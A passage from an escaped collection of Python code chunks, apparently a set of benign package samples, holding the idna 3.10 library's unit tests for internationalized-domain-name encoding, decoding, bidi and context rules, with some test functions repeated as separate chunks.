[\"\\u0baa\\u0bb0\\u0bbf\\u0b9f\\u0bcd\\u0b9a\\u0bc8\", b\"xn--hlcj6aya9esc7a\"],\n            [\"\\u0443\\u043a\\u0440\", b\"xn--j1amh\"],\n            [\"\\u9999\\u6e2f\", b\"xn--j6w193g\"],\n            [\"\\u03b4\\u03bf\\u03ba\\u03b9\\u03bc\\u03ae\", b\"xn--jxalpdlp\"],\n            [\"\\u0625\\u062e\\u062a\\u0628\\u0627\\u0631\", b\"xn--kgbechtv\"],\n            [\"\\u53f0\\u6e7e\", b\"xn--kprw13d\"],\n            [\"\\u53f0\\u7063\", b\"xn--kpry57d\"],\n            [\"\\u0627\\u0644\\u062c\\u0632\\u0627\\u0626\\u0631\", b\"xn--lgbbat1ad8j\"],\n            [\"\\u0639\\u0645\\u0627\\u0646\", b\"xn--mgb9awbf\"],\n            [\"\\u0627\\u06cc\\u0631\\u0627\\u0646\", b\"xn--mgba3a4f16a\"],\n            [\"\\u0627\\u0645\\u0627\\u0631\\u0627\\u062a\", b\"xn--mgbaam7a8h\"],\n            [\"\\u067e\\u0627\\u06a9\\u0633\\u062a\\u0627\\u0646\", b\"xn--mgbai9azgqp6j\"],\n            [\"\\u0627\\u0644\\u0627\\u0631\\u062f\\u0646\", b\"xn--mgbayh7gpa\"],\n            [\"\\u0628\\u06be\\u0627\\u0631\\u062a\", b\"xn--mgbbh1a71e\"],\n            [\"\\u0627\\u0644\\u0645\\u063a\\u0631\\u0628\", b\"xn--mgbc0a9azcg\"],\n            [\"\\u0627\\u0644\\u0633\\u0639\\u0648\\u062f\\u064a\\u0629\", b\"xn--mgberp4a5d4ar\"],\n            [\"\\u10d2\\u10d4\", b\"xn--node\"],\n            [\"\\u0e44\\u0e17\\u0e22\", b\"xn--o3cw4h\"],\n            [\"\\u0633\\u0648\\u0631\\u064a\\u0629\", b\"xn--ogbpf8fl\"],\n            [\"\\u0440\\u0444\", b\"xn--p1ai\"],\n            [\"\\u062a\\u0648\\u0646\\u0633\", b\"xn--pgbs0dh\"],\n            [\"\\u0a2d\\u0a3e\\u0a30\\u0a24\", b\"xn--s9brj9c\"],\n            [\"\\u0645\\u0635\\u0631\", b\"xn--wgbh1c\"],\n            [\"\\u0642\\u0637\\u0631\", b\"xn--wgbl6a\"],\n            [\"\\u0b87\\u0bb2\\u0b99\\u0bcd\\u0b95\\u0bc8\", b\"xn--xkc2al3hye2a\"],\n            [\"\\u0b87\\u0ba8\\u0bcd\\u0ba4\\u0bbf\\u0baf\\u0bbe\", b\"xn--xkc2dl3a5ee0h\"],\n            [\"\\u65b0\\u52a0\\u5761\", b\"xn--yfro4i67o\"],\n            [\"\\u0641\\u0644\\u0633\\u0637\\u064a\\u0646\", b\"xn--ygbi2ammx\"],\n            [\"\\u30c6\\u30b9\\u30c8\", b\"xn--zckzah\"],\n            [\"\\u049b\\u0430\\u0437\", b\"xn--80ao21a\"],\n            [\"\\u0645\\u0644\\u064a\\u0633\\u064a\\u0627\", b\"xn--mgbx4cd0ab\"],\n            [\"\\u043c\\u043e\\u043d\", b\"xn--l1acc\"],\n            [\"\\u0633\\u0648\\u062f\\u0627\\u0646\", b\"xn--mgbpl2fh\"],\n        ]\n\n    def testIDNTLDALabels(self):\n        for ulabel, alabel in self.tld_strings:\n            self.assertEqual(alabel, idna.alabel(ulabel))\n\n    def testIDNTLDULabels(self):\n        for ulabel, alabel in self.tld_strings:\n            self.assertEqual(ulabel, idna.ulabel(alabel))\n\n    def test_valid_label_length(self):\n        self.assertTrue(idna.valid_label_length(\"a\" * 63))\n        self.assertFalse(idna.valid_label_length(\"a\" * 64))\n        self.assertRaises(idna.IDNAError, idna.encode, \"a\" * 64)\n\n    def test_check_bidi(self):\n        la = \"\\u0061\"\n        r = \"\\u05d0\"\n        al = \"\\u0627\"\n        an = \"\\u0660\"\n        en = \"\\u0030\"\n        es = \"\\u002d\"\n        cs = \"\\u002c\"\n        et = \"\\u0024\"\n        on = \"\\u0021\"\n        bn = \"\\u200c\"\n        nsm = \"\\u0610\"\n        ws = \"\\u0020\"\n\n        # RFC 5893 Rule 1\n        self.assertTrue(idna.check_bidi(la))\n        self.assertTrue(idna.check_bidi(r))\n        self.assertTrue(idna.check_bidi(al))\n        self.assertRaises(idna.IDNABidiError, idna.check_bidi, an)\n\n        # RFC 5893 Rule 2\n        self.assertTrue(idna.check_bidi(r + al))\n        self.assertTrue(idna.check_bidi(r + al))\n        self.assertTrue(idna.check_bidi(r + an))\n        self.assertTrue(idna.check_bidi(r + en))\n        self.assertTrue(idna.check_bidi(r + es + al))\n        self.assertTrue(idna.check_bidi(r + cs + al))\n        self.assertTrue(idna.check_bidi(r + et + al))\n        self.assertTrue(idna.check_bidi(r + on + al))\n        self.assertTrue(idna.check_bidi(r + bn + al))\n        self.assertTrue(idna.check_bidi(r + nsm))\n        self.assertRaises(idna.IDNABidiError, idna.check_bidi, r + la)\n        self.assertRaises(idna.IDNABidiError, idna.check_bidi, r + ws)\n\n        # RFC 5893 Rule 3\n        self.assertTrue(idna.check_bidi(r + al))\n        self.assertTrue(idna.check_bidi(r + en))\n        self.assertTrue(idna.check_bidi(r + an))\n        self.assertTrue(idna.check_bidi(r + nsm))\n        self.assertTrue(idna.check_bidi(r + nsm + nsm))\n        self.assertRaises(idna.IDNABidiError, idna.check_bidi, r + on)\n\n        # RFC 5893 Rule 4\n        self.assertTrue(idna.check_bidi(r + en))\n        self.assertTrue(idna.check_bidi(r + an))\n        self.assertRaises(idna.IDNABidiError, idna.check_bidi, r + en + an)\n        self.assertRaises(idna.IDNABidiError, idna.check_bidi, r + an + en)\n\n        # RFC 5893 Rule 5\n        self.assertTrue(idna.check_bidi(la + en, check_ltr=True))\n        self.assertTrue(idna.check_bidi(la + es + la, check_ltr=True))\n        self.assertTrue(idna.check_bidi(la + cs + la, check_ltr=True))\n        self.assertTrue(idna.check_bidi(la + et + la, check_ltr=True))\n        self.assertTrue(idna.check_bidi(la + on + la, check_ltr=True))\n        self.assertTrue(idna.check_bidi(la + bn + la, check_ltr=True))\n        self.assertTrue(idna.check_bidi(la + nsm, check_ltr=True))\n\n        # RFC 5893 Rule 6\n        self.assertTrue(idna.check_bidi(la + la, check_ltr=True))\n        self.assertTrue(idna.check_bidi(la + en, check_ltr=True))\n        self.assertTrue(idna.check_bidi(la + en + nsm, check_ltr=True))\n        self.assertTrue(idna.check_bidi(la + en + nsm + nsm, check_ltr=True))\n        self.assertRaises(idna.IDNABidiError, idna.check_bidi, la + cs, check_ltr=True)\n\n    def test_check_initial_combiner(self):\n        m = \"\\u0300\"\n        a = \"\\u0061\"\n\n        self.assertTrue(idna.check_initial_combiner(a))\n        self.assertTrue(idna.check_initial_combiner(a + m))\n        self.assertRaises(idna.IDNAError, idna.check_initial_combiner, m + a)\n\n    def test_check_hyphen_ok(self):\n        self.assertTrue(idna.check_hyphen_ok(\"abc\"))\n        self.assertTrue(idna.check_hyphen_ok(\"a--b\"))\n        self.assertRaises(idna.IDNAError, idna.check_hyphen_ok, \"aa--\")\n        self.assertRaises(idna.IDNAError, idna.check_hyphen_ok, \"a-\")\n        self.assertRaises(idna.IDNAError, idna.check_hyphen_ok, \"-a\")\n\n    def test_valid_contextj(self):\n        zwnj = \"\\u200c\"\n        zwj = \"\\u200d\"\n        virama = \"\\u094d\"\n        latin = \"\\u0061\"\n\n        # RFC 5892 Appendix A.1 (Zero Width Non-Joiner)\n        self.assertFalse(idna.valid_contextj(zwnj, 0))\n        self.assertFalse(idna.valid_contextj(latin + zwnj, 1))  # No preceding Virama\n        self.assertTrue(idna.valid_contextj(virama + zwnj, 1))  # Preceding Virama\n\n        # RFC 5892 Appendix A.2 (Zero Width Joiner)\n        self.assertFalse(idna.valid_contextj(zwj, 0))\n        self.assertFalse(idna.valid_contextj(latin + zwj, 1))  # No preceding Virama\n        self.assertTrue(idna.valid_contextj(virama + zwj, 1))  # Preceding Virama\n\n    def test_valid_contexto(self):\n        latin = \"\\u0061\"\n        latin_l = \"\\u006c\"\n        greek = \"\\u03b1\"\n        hebrew = \"\\u05d0\"\n        katakana = \"\\u30a1\"\n        hiragana = \"\\u3041\"\n        han = \"\\u6f22\"\n        arabic_digit = \"\\u0660\"\n        ext_arabic_digit = \"\\u06f0\"\n\n        # RFC 5892 Rule A.3 (Middle Dot)\n        latin_middle_dot = \"\\u00b7\"\n        self.assertTrue(idna.valid_contexto(latin_l + latin_middle_dot + latin_l, 1))\n        self.assertFalse(idna.valid_contexto(latin_middle_dot + latin_l, 1))\n        self.assertFalse(idna.valid_contexto(latin_l + latin_middle_dot, 0))\n        self.assertFalse(idna.valid_contexto(latin_middle_dot, 0))\n        self.assertFalse(idna.valid_contexto(latin_l + latin_middle_dot + latin, 1))\n\n        # RFC 5892 Rule A.4 (Greek Lower Numeral Sign)\n        glns = \"\\u0375\"\n        self.assertTrue(idna.valid_contexto(glns + greek, 0))\n        self.assertFalse(idna.valid_contexto(glns + latin, 0))\n        self.assertFalse(idna.valid_contexto(glns, 0))\n        self.assertFalse(idna.valid_contexto(greek + glns, 1))\n\n        # RFC 5892 Rule A.5 (Hebrew Punctuation Geresh)\n        geresh = \"\\u05f3\"\n        self.assertTrue(idna.valid_contexto(hebrew + geresh, 1))\n        self.assertFalse(idna.valid_contexto(latin + geresh, 1))\n\n        # RFC 5892 Rule A.6 (Hebrew Punctuation Gershayim)\n        gershayim = \"\\u05f4\"\n        self.assertTrue(idna.valid_contexto(hebrew + gershayim, 1))\n        self.assertFalse(idna.valid_contexto(latin + gershayim, 1))\n\n        # RFC 5892 Rule A.7 (Katakana Middle Dot)\n        ja_middle_dot = \"\\u30fb\"\n        self.assertTrue(idna.valid_contexto(katakana + ja_middle_dot + katakana, 1))\n        self.assertTrue(idna.valid_contexto(hiragana + ja_middle_dot + hiragana, 1))\n        self.assertTrue(idna.valid_contexto(han + ja_middle_dot + han, 1))\n        self.assertTrue(idna.valid_contexto(han + ja_middle_dot + latin, 1))\n        self.assertTrue(idna.valid_contexto(\"\\u6f22\\u30fb\\u5b57\", 1))\n        self.assertFalse(idna.valid_contexto(\"\\u0061\\u30fb\\u0061\", 1))\n\n        # RFC 5892 Rule A.8 (Arabic-Indic Digits)\n        self.assertTrue(idna.valid_contexto(arabic_digit + arabic_digit, 0))\n        self.assertFalse(idna.valid_contexto(arabic_digit + ext_arabic_digit, 0))\n\n        # RFC 5892 Rule A.9 (Extended Arabic-Indic Digits)\n        self.assertTrue(idna.valid_contexto(ext_arabic_digit + ext_arabic_digit, 0))\n        self.assertFalse(idna.valid_contexto(ext_arabic_digit + arabic_digit, 0))\n\n    def test_encode(self, encode=None, skip_bytes=False):\n        if encode is None:\n            encode = idna.encode\n\n        self.assertEqual(encode(\"xn--zckzah.xn--zckzah\"), b\"xn--zckzah.xn--zckzah\")\n        self.assertEqual(encode(\"\\u30c6\\u30b9\\u30c8.xn--zckzah\"), b\"xn--zckzah.xn--zckzah\")\n        self.assertEqual(encode(\"\\u30c6\\u30b9\\u30c8.\\u30c6\\u30b9\\u30c8\"), b\"xn--zckzah.xn--zckzah\")\n        self.assertEqual(encode(\"abc.abc\"), b\"abc.abc\")\n        self.assertEqual(encode(\"xn--zckzah.abc\"), b\"xn--zckzah.abc\")\n        self.assertEqual(encode(\"\\u30c6\\u30b9\\u30c8.abc\"), b\"xn--zckzah.abc\")\n        self.assertEqual(\n            encode(\"\\u0521\\u0525\\u0523-\\u0523\\u0523-----\\u0521\\u0523\\u0523\\u0523.aa\"),\n            b\"xn---------90gglbagaar.aa\",\n        )\n        if encode is idna.encode:\n            self.assertRaises(\n                idna.IDNAError,\n                encode,\n                \"\\u0521\\u0524\\u0523-\\u0523\\u0523-----\\u0521\\u0523\\u0523\\u0523.aa\",\n                uts46=False,\n            )\n        self.assertEqual(encode(\"a\" * 63), b\"a\" * 63)\n        self.assertRaises(idna.IDNAError, encode, \"a\" * 64)\n        self.assertRaises(idna.core.InvalidCodepoint, encode, \"*\")\n        if not skip_bytes:\n            self.assertRaises(idna.IDNAError, encode, b\"\\x0a\\x33\\x81\")\n\n    def test_decode(self, decode=None, skip_str=False):\n        if decode is None:\n            decode = idna.decode\n        self.assertEqual(decode(b\"xn--zckzah.xn--zckzah\"), \"\\u30c6\\u30b9\\u30c8.\\u30c6\\u30b9\\u30c8\")\n        self.assertEqual(\n            decode(b\"xn--d1acufc.xn--80akhbyknj4f\"),\n            \"\\u0434\\u043e\\u043c\\u0435\\u043d.\\u0438\\u0441\\u043f\\u044b\\u0442\\u0430\\u043d\\u0438\\u0435\",\n        )\n        if not skip_str:\n            self.assertEqual(\n                decode(\"\\u30c6\\u30b9\\u30c8.xn--zckzah\"),\n                \"\\u30c6\\u30b9\\u30c8.\\u30c6\\u30b9\\u30c8\",\n            )\n            self.assertEqual(\n                decode(\"\\u30c6\\u30b9\\u30c8.\\u30c6\\u30b9\\u30c8\"),\n                \"\\u30c6\\u30b9\\u30c8.\\u30c6\\u30b9\\u30c8\",\n            )\n            self.assertEqual(decode(\"abc.abc\"), \"abc.abc\")\n        self.assertEqual(\n            decode(b\"xn---------90gglbagaar.aa\"),\n            \"\\u0521\\u0525\\u0523-\\u0523\\u0523-----\\u0521\\u0523\\u0523\\u0523.aa\",\n        )\n        self.assertRaises(idna.IDNAError, decode, b\"XN---------90GGLBAGAAC.AA\")\n        self.assertRaises(idna.IDNAError, decode, b\"xn---------90gglbagaac.aa\")\n        self.assertRaises(idna.IDNAError, decode, b\"xn--\")\n        self.assertRaises(idna.IDNAError, decode, b\"\\x8d\\xd2\")\n        self.assertRaises(\n            idna.IDNAError,\n            decode,\n            b\"A.A.0.a.a.A.0.a.A.A.0.a.A.0A.2.a.A.A.0.a.A.0.A.a.A0.a.a.A.0.a.fB.A.A.a.A.A.B.A.A.a.A.A.B.A.A.a.A.A.0.a.A.a.a.A.A.0.a.A.0.A.a.A0.a.a.A.0.a.fB.A.A.a.A.A.B.0A.A.a.A.A.B.A.A.a.A.A.a.A.A.B.A.A.a.A.0.a.B.A.A.a.A.B.A.a.A.A.5.a.A.0.a.Ba.A.B.A.A.a.A.0.a.Xn--B.A.A.A.a\",\n        )\n        self.assertRaises(idna.IDNAError, decode, b\"xn--ukba655qaaaa14431eeaaba.c\")\n==================================================\n\n# File: data/benign_samples/pypi/popular/idna/3.10/idna-3.10/tests/test_idna.py (function)\ndef setUp(self):\n        self.tld_strings = [\n            [\"\\u6d4b\\u8bd5\", b\"xn--0zwm56d\"],\n            [\"\\u092a\\u0930\\u0940\\u0915\\u094d\\u0937\\u093e\", b\"xn--11b5bs3a9aj6g\"],\n            [\"\\ud55c\\uad6d\", b\"xn--3e0b707e\"],\n            [\"\\u09ad\\u09be\\u09b0\\u09a4\", b\"xn--45brj9c\"],\n            [\"\\u09ac\\u09be\\u0982\\u09b2\\u09be\", b\"xn--54b7fta0cc\"],\n            [\n                \"\\u0438\\u0441\\u043f\\u044b\\u0442\\u0430\\u043d\\u0438\\u0435\",\n                b\"xn--80akhbyknj4f\",\n            ],\n            [\"\\u0441\\u0440\\u0431\", b\"xn--90a3ac\"],\n            [\"\\ud14c\\uc2a4\\ud2b8\", b\"xn--9t4b11yi5a\"],\n            [\n                \"\\u0b9a\\u0bbf\\u0b99\\u0bcd\\u0b95\\u0baa\\u0bcd\\u0baa\\u0bc2\\u0bb0\\u0bcd\",\n                b\"xn--clchc0ea0b2g2a9gcd\",\n            ],\n            [\"\\u05d8\\u05e2\\u05e1\\u05d8\", b\"xn--deba0ad\"],\n            [\"\\u4e2d\\u56fd\", b\"xn--fiqs8s\"],\n            [\"\\u4e2d\\u570b\", b\"xn--fiqz9s\"],\n            [\"\\u0c2d\\u0c3e\\u0c30\\u0c24\\u0c4d\", b\"xn--fpcrj9c3d\"],\n            [\"\\u0dbd\\u0d82\\u0d9a\\u0dcf\", b\"xn--fzc2c9e2c\"],\n            [\"\\u6e2c\\u8a66\", b\"xn--g6w251d\"],\n            [\"\\u0aad\\u0abe\\u0ab0\\u0aa4\", b\"xn--gecrj9c\"],\n            [\"\\u092d\\u093e\\u0930\\u0924\", b\"xn--h2brj9c\"],\n            [\"\\u0622\\u0632\\u0645\\u0627\\u06cc\\u0634\\u06cc\", b\"xn--hgbk6aj7f53bba\"],\n            [\"\\u0baa\\u0bb0\\u0bbf\\u0b9f\\u0bcd\\u0b9a\\u0bc8\", b\"xn--hlcj6aya9esc7a\"],\n            [\"\\u0443\\u043a\\u0440\", b\"xn--j1amh\"],\n            [\"\\u9999\\u6e2f\", b\"xn--j6w193g\"],\n            [\"\\u03b4\\u03bf\\u03ba\\u03b9\\u03bc\\u03ae\", b\"xn--jxalpdlp\"],\n            [\"\\u0625\\u062e\\u062a\\u0628\\u0627\\u0631\", b\"xn--kgbechtv\"],\n            [\"\\u53f0\\u6e7e\", b\"xn--kprw13d\"],\n            [\"\\u53f0\\u7063\", b\"xn--kpry57d\"],\n            [\"\\u0627\\u0644\\u062c\\u0632\\u0627\\u0626\\u0631\", b\"xn--lgbbat1ad8j\"],\n            [\"\\u0639\\u0645\\u0627\\u0646\", b\"xn--mgb9awbf\"],\n            [\"\\u0627\\u06cc\\u0631\\u0627\\u0646\", b\"xn--mgba3a4f16a\"],\n            [\"\\u0627\\u0645\\u0627\\u0631\\u0627\\u062a\", b\"xn--mgbaam7a8h\"],\n            [\"\\u067e\\u0627\\u06a9\\u0633\\u062a\\u0627\\u0646\", b\"xn--mgbai9azgqp6j\"],\n            [\"\\u0627\\u0644\\u0627\\u0631\\u062f\\u0646\", b\"xn--mgbayh7gpa\"],\n            [\"\\u0628\\u06be\\u0627\\u0631\\u062a\", b\"xn--mgbbh1a71e\"],\n            [\"\\u0627\\u0644\\u0645\\u063a\\u0631\\u0628\", b\"xn--mgbc0a9azcg\"],\n            [\"\\u0627\\u0644\\u0633\\u0639\\u0648\\u062f\\u064a\\u0629\", b\"xn--mgberp4a5d4ar\"],\n            [\"\\u10d2\\u10d4\", b\"xn--node\"],\n            [\"\\u0e44\\u0e17\\u0e22\", b\"xn--o3cw4h\"],\n            [\"\\u0633\\u0648\\u0631\\u064a\\u0629\", b\"xn--ogbpf8fl\"],\n            [\"\\u0440\\u0444\", b\"xn--p1ai\"],\n            [\"\\u062a\\u0648\\u0646\\u0633\", b\"xn--pgbs0dh\"],\n            [\"\\u0a2d\\u0a3e\\u0a30\\u0a24\", b\"xn--s9brj9c\"],\n            [\"\\u0645\\u0635\\u0631\", b\"xn--wgbh1c\"],\n            [\"\\u0642\\u0637\\u0631\", b\"xn--wgbl6a\"],\n            [\"\\u0b87\\u0bb2\\u0b99\\u0bcd\\u0b95\\u0bc8\", b\"xn--xkc2al3hye2a\"],\n            [\"\\u0b87\\u0ba8\\u0bcd\\u0ba4\\u0bbf\\u0baf\\u0bbe\", b\"xn--xkc2dl3a5ee0h\"],\n            [\"\\u65b0\\u52a0\\u5761\", b\"xn--yfro4i67o\"],\n            [\"\\u0641\\u0644\\u0633\\u0637\\u064a\\u0646\", b\"xn--ygbi2ammx\"],\n            [\"\\u30c6\\u30b9\\u30c8\", b\"xn--zckzah\"],\n            [\"\\u049b\\u0430\\u0437\", b\"xn--80ao21a\"],\n            [\"\\u0645\\u0644\\u064a\\u0633\\u064a\\u0627\", b\"xn--mgbx4cd0ab\"],\n            [\"\\u043c\\u043e\\u043d\", b\"xn--l1acc\"],\n            [\"\\u0633\\u0648\\u062f\\u0627\\u0646\", b\"xn--mgbpl2fh\"],\n        ]\n==================================================\n\n# File: data/benign_samples/pypi/popular/idna/3.10/idna-3.10/tests/test_idna.py (function)\ndef testIDNTLDALabels(self):\n        for ulabel, alabel in self.tld_strings:\n            self.assertEqual(alabel, idna.alabel(ulabel))\n==================================================\n\n# File: data/benign_samples/pypi/popular/idna/3.10/idna-3.10/tests/test_idna.py (function)\ndef testIDNTLDULabels(self):\n        for ulabel, alabel in self.tld_strings:\n            self.assertEqual(ulabel, idna.ulabel(alabel))\n==================================================\n\n# File: data/benign_samples/pypi/popular/idna/3.10/idna-3.10/tests/test_idna.py (function)\ndef test_valid_label_length(self):\n        self.assertTrue(idna.valid_label_length(\"a\" * 63))\n        self.assertFalse(idna.valid_label_length(\"a\" * 64))\n        self.assertRaises(idna.IDNAError, idna.encode, \"a\" * 64)\n==================================================\n\n# File: data/benign_samples/pypi/popular/idna/3.10/idna-3.10/tests/test_idna.py (function)\ndef test_check_bidi(self):\n        la = \"\\u0061\"\n        r = \"\\u05d0\"\n        al = \"\\u0627\"\n        an = \"\\u0660\"\n        en = \"\\u0030\"\n        es = \"\\u002d\"\n        cs = \"\\u002c\"\n        et = \"\\u0024\"\n        on = \"\\u0021\"\n        bn = \"\\u200c\"\n        nsm = \"\\u0610\"\n        ws = \"\\u0020\"\n\n        # RFC 5893 Rule 1\n        self.assertTrue(idna.check_bidi(la))\n        self.assertTrue(idna.check_bidi(r))\n        self.assertTrue(idna.check_bidi(al))\n        self.assertRaises(idna.IDNABidiError, idna.check_bidi, an)\n\n        # RFC 5893 Rule 2\n        self.assertTrue(idna.check_bidi(r + al))\n        self.assertTrue(idna.check_bidi(r + al))\n        self.assertTrue(idna.check_bidi(r + an))\n        self.assertTrue(idna.check_bidi(r + en))\n        self.assertTrue(idna.check_bidi(r + es + al))\n        self.assertTrue(idna.check_bidi(r + cs + al))\n        self.assertTrue(idna.check_bidi(r + et + al))\n        self.assertTrue(idna.check_bidi(r + on + al))\n        self.assertTrue(idna.check_bidi(r + bn + al))\n        self.assertTrue(idna.check_bidi(r + nsm))\n        self.assertRaises(idna.IDNABidiError, idna.check_bidi, r + la)\n        self.assertRaises(idna.IDNABidiError, idna.check_bidi, r + ws)\n\n        # RFC 5893 Rule 3\n        self.assertTrue(idna.check_bidi(r + al))\n        self.assertTrue(idna.check_bidi(r + en))\n        self.assertTrue(idna.check_bidi(r + an))\n        self.assertTrue(idna.check_bidi(r + nsm))\n        self.assertTrue(idna.check_bidi(r + nsm + nsm))\n        self.assertRaises(idna.IDNABidiError, idna.check_bidi, r + on)\n\n        # RFC 5893 Rule 4\n        self.assertTrue(idna.check_bidi(r + en))\n        self.assertTrue(idna.check_bidi(r + an))\n        self.assertRaises(idna.IDNABidiError, idna.check_bidi, r + en + an)\n        self.assertRaises(idna.IDNABidiError, idna.check_bidi, r + an + en)\n\n        # RFC 5893 Rule 5\n        self.assertTrue(idna.check_bidi(la + en, check_ltr=True))\n        self.assertTrue(idna.check_bidi(la + es + la, check_ltr=True))\n        self.assertTrue(idna.check_bidi(la + cs + la, check_ltr=True))\n        self.assertTrue(idna.check_bidi(la + et + la, check_ltr=True))\n        self.assertTrue(idna.check_bidi(la + on + la, check_ltr=True))\n        self.assertTrue(idna.check_bidi(la + bn + la, check_ltr=True))\n        self.assertTrue(idna.check_bidi(la + nsm, check_ltr=True))\n\n        # RFC 5893 Rule 6\n        self.assertTrue(idna.check_bidi(la + la, check_ltr=True))\n        self.assertTrue(idna.check_bidi(la + en, check_ltr=True))\n        self.assertTrue(idna.check_bidi(la + en + nsm, check_ltr=True))\n        self.assertTrue(idna.check_bidi(la + en + nsm + nsm, check_ltr=True))\n        self.assertRaises(idna.IDNABidiError, idna.check_bidi, la + cs, check_ltr=True)\n==================================================\n\n# File: data/benign_samples/pypi/popular/idna/3.10/idna-3.10/tests/test_idna.py (function)\ndef test_check_initial_combiner(self):\n        m = \"\\u0300\"\n        a = \"\\u0061\"\n\n        self.assertTrue(idna.check_initial_combiner(a))\n        self.assertTrue(idna.check_initial_combiner(a + m))\n        self.assertRaises(idna.IDNAError, idna.check_initial_combiner, m + a)\n==================================================\n\n# File: data/benign_samples/pypi/popular/idna/3.10/idna-3.10/tests/test_idna.py (function)\ndef test_check_hyphen_ok(self):\n        self.assertTrue(idna.check_hyphen_ok(\"abc\"))\n        self.assertTrue(idna.check_hyphen_ok(\"a--b\"))\n        self.assertRaises(idna.IDNAError, idna.check_hyphen_ok, \"aa--\")\n        self.assertRaises(idna.IDNAError, idna.check_hyphen_ok, \"a-\")\n        self.assertRaises(idna.IDNAError, idna.check_hyphen_ok, \"-a\")\n==================================================\n\n# File: data/benign_samples/pypi/popular/idna/3.10/idna-3.10/tests/test_idna.py (function)\ndef test_valid_contextj(self):\n        zwnj = \"\\u200c\"\n        zwj = \"\\u200d\"\n        virama = \"\\u094d\"\n        latin = \"\\u0061\"\n\n        # RFC 5892 Appendix A.1 (Zero Width Non-Joiner)\n        self.assertFalse(idna.valid_contextj(zwnj, 0))\n        self.assertFalse(idna.valid_contextj(latin + zwnj, 1))  # No preceding Virama\n        self.assertTrue(idna.valid_contextj(virama + zwnj, 1))  # Preceding Virama\n\n        # RFC 5892 Appendix A.2 (Zero Width Joiner)\n        self.assertFalse(idna.valid_contextj(zwj, 0))\n        self.assertFalse(idna.valid_contextj(latin + zwj, 1))  # No preceding Virama\n        self.assertTrue(idna.valid_contextj(virama + zwj, 1))\n==================================================\n\n# File: data/benign_samples/pypi/popular/idna/3.10/idna-3.10/tests/test_idna.py (function)\ndef test_valid_contexto(self):\n        latin = \"\\u0061\"\n        latin_l = \"\\u006c\"\n        greek = \"\\u03b1\"\n        hebrew = \"\\u05d0\"\n        katakana = \"\\u30a1\"\n        hiragana = \"\\u3041\"\n        han = \"\\u6f22\"\n        arabic_digit = \"\\u0660\"\n        ext_arabic_digit = \"\\u06f0\"\n\n        # RFC 5892 Rule A.3 (Middle Dot)\n        latin_middle_dot = \"\\u00b7\"\n        self.assertTrue(idna.valid_contexto(latin_l + latin_middle_dot + latin_l, 1))\n        self.assertFalse(idna.valid_contexto(latin_middle_dot + latin_l, 1))\n        self.assertFalse(idna.valid_contexto(latin_l + latin_middle_dot, 0))\n        self.assertFalse(idna.valid_contexto(latin_middle_dot, 0))\n        self.assertFalse(idna.valid_contexto(latin_l + latin_middle_dot + latin, 1))\n\n        # RFC 5892 Rule A.4 (Greek Lower Numeral Sign)\n        glns = \"\\u0375\"\n        self.assertTrue(idna.valid_contexto(glns + greek, 0))\n        self.assertFalse(idna.valid_contexto(glns + latin, 0))\n        self.assertFalse(idna.valid_contexto(glns, 0))\n        self.assertFalse(idna.valid_contexto(greek + glns, 1))\n\n        # RFC 5892 Rule A.5 (Hebrew Punctuation Geresh)\n        geresh = \"\\u05f3\"\n        self.assertTrue(idna.valid_contexto(hebrew + geresh, 1))\n        self.assertFalse(idna.valid_contexto(latin + geresh, 1))\n\n        # RFC 5892 Rule A.6 (Hebrew Punctuation Gershayim)\n        gershayim = \"\\u05f4\"\n        self.assertTrue(idna.valid_contexto(hebrew + gershayim, 1))\n        self.assertFalse(idna.valid_contexto(latin + gershayim, 1))\n\n        # RFC 5892 Rule A.7 (Katakana Middle Dot)\n        ja_middle_dot = \"\\u30fb\"\n        self.assertTrue(idna.valid_contexto(katakana + ja_middle_dot + katakana, 1))\n        self.assertTrue(idna.valid_contexto(hiragana + ja_middle_dot + hiragana, 1))\n        self.assertTrue(idna.valid_contexto(han + ja_middle_dot + han, 1))\n        self.assertTrue(idna.valid_contexto(han + ja_middle_dot + latin, 1))\n        self.assertTrue(idna.valid_contexto(\"\\u6f22\\u30fb\\u5b57\", 1))\n        self.assertFalse(idna.valid_contexto(\"\\u0061\\u30fb\\u0061\", 1))\n\n        # RFC 5892 Rule A.8 (Arabic-Indic Digits)\n        self.assertTrue(idna.valid_contexto(arabic_digit + arabic_digit, 0))\n        self.assertFalse(idna.valid_contexto(arabic_digit + ext_arabic_digit, 0))\n\n        # RFC 5892 Rule A.9 (Extended Arabic-Indic Digits)\n        self.assertTrue(idna.valid_contexto(ext_arabic_digit + ext_arabic_digit, 0))\n        self.assertFalse(idna.valid_contexto(ext_arabic_digit + arabic_digit, 0))\n==================================================\n\n# File: data/benign_samples/pypi/popular/idna/3.10/idna-3.10/tests/test_idna.py (function)\ndef test_encode(self, encode=None, skip_bytes=False):\n        if encode is None:\n            encode = idna.encode\n\n        self.assertEqual(encode(\"xn--zckzah.xn--zckzah\"), b\"xn--zckzah.xn--zckzah\")\n        self.assertEqual(encode(\"\\u30c6\\u30b9\\u30c8.xn--zckzah\"), b\"xn--zckzah.xn--zckzah\")\n        self.assertEqual(encode(\"\\u30c6\\u30b9\\u30c8.\\u30c6\\u30b9\\u30c8\"), b\"xn--zckzah.xn--zckzah\")\n        self.assertEqual(encode(\"abc.abc\"), b\"abc.abc\")\n        self.assertEqual(encode(\"xn--zckzah.abc\"), b\"xn--zckzah.abc\")\n        self.assertEqual(encode(\"\\u30c6\\u30b9\\u30c8.abc\"), b\"xn--zckzah.abc\")\n        self.assertEqual(\n            encode(\"\\u0521\\u0525\\u0523-\\u0523\\u0523-----\\u0521\\u0523\\u0523\\u0523.aa\"),\n            b\"xn---------90gglbagaar.aa\",\n        )\n        if encode is idna.encode:\n            self.assertRaises(\n                idna.IDNAError,\n                encode,\n                \"\\u0521\\u0524\\u0523-\\u0523\\u0523-----\\u0521\\u0523\\u0523\\u0523.aa\",\n                uts46=False,\n            )\n        self.assertEqual(encode(\"a\" * 63), b\"a\" * 63)\n        self.assertRaises(idna.IDNAError, encode, \"a\" * 64)\n        self.assertRaises(idna.core.InvalidCodepoint, encode, \"*\")\n        if not skip_bytes:\n            self.assertRaises(idna.IDNAError, encode, b\"\\x0a\\x33\\x81\")\n==================================================\n\n# File: data/benign_samples/pypi/popular/idna/3.10/idna-3.10/tests/test_idna.py (function)\ndef test_decode(self, decode=None, skip_str=False):\n        if decode is None:\n            decode = idna.decode\n        self.assertEqual(decode(b\"xn--zckzah.xn--zckzah\"), \"\\u30c6\\u30b9\\u30c8.\\u30c6\\u30b9\\u30c8\")\n        self.assertEqual(\n            decode(b\"xn--d1acufc.xn--80akhbyknj4f\"),\n            